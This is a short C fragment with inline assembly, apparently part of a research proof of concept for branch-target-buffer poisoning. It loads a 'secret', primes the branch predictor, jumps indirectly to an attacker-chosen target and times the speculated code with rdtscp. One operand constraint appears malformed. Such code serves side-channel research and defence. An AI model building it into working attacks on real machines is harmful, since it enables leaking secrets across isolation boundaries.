/* set the "secret" */
asm("movq %[secret], %%r15;" :: [secret] "" (secret) :);

/* set (but don't flush) the indirect jump target */
asm volatile (
  "movq $SPECULATE_THIS, %[p];"
  NOP4 NOP2 NOP1
  : [p] "+m" (ptr)
  :
  );

/* prepare branch predictor state */
asm("BEG:;");
JMPNEXT64

/* indirect jump, poison's victim BTB as a side-effect */
asm("JUMP:;");
asm("jmp *%[target];"
  :
  : [target] "m" (ptr)
  );
asm(NOP4096);

/* victim's real target - do nothing */
asm("TARGET:;");
asm("jmp END;");
asm(NOP4096);

/* attacker's expected target */
asm("SPECULATE_THIS:;");

/* gather timing information */
tsc = __rdtscp(&junk);
CRC321 CRC324 CRC322
tsc = __rdtscp(&junk) - tsc;

asm("END:;");
